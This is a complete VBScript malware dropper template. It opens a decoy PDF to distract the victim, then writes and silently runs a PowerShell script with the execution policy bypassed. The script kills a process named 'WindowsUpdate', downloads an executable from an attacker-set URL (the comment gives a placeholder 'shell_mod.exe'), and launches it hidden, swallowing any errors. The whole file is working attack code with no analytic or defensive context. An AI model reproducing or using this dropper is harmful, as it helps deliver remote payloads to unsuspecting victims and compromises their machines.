Dim shell, psCode, tempFile, fso, pdfUrl

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' URL of PDF to open
pdfUrl = ""
DownloadUrl = "" ' http://00.000.000.000/shell_mod.exe
File_name = "" ' Ex: shell_mod.exe

shell.Run "cmd /c start """" """ & pdfUrl & """", 0, False

tempFile = shell.ExpandEnvironmentStrings("%TEMP%") & "\temp_dropper.ps1"

psCode = _
"$url = '" & DownloadUrl & "'" & vbCrLf & _
"$dest = ""$env:TEMP\" & File_name & """" & vbCrLf & _
"try {" & vbCrLf & _
"    $runningProc = Get-Process -Name 'WindowsUpdate' -ErrorAction SilentlyContinue" & vbCrLf & _
"    if ($runningProc) {" & vbCrLf & _
"        Stop-Process -Name 'WindowsUpdate' -Force" & vbCrLf & _
"        Start-Sleep -Seconds 2" & vbCrLf & _
"    }" & vbCrLf & _
"    Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing" & vbCrLf & _
"    Start-Process $dest -WindowStyle Hidden" & vbCrLf & _
"} catch {" & vbCrLf & _
"}"

' Write the PowerShell script to temp file
With fso.CreateTextFile(tempFile, True)
    .WriteLine psCode
    .Close
End With

' Run the PowerShell script silently
shell.Run "powershell -ExecutionPolicy Bypass -File """ & tempFile & """", 0, False
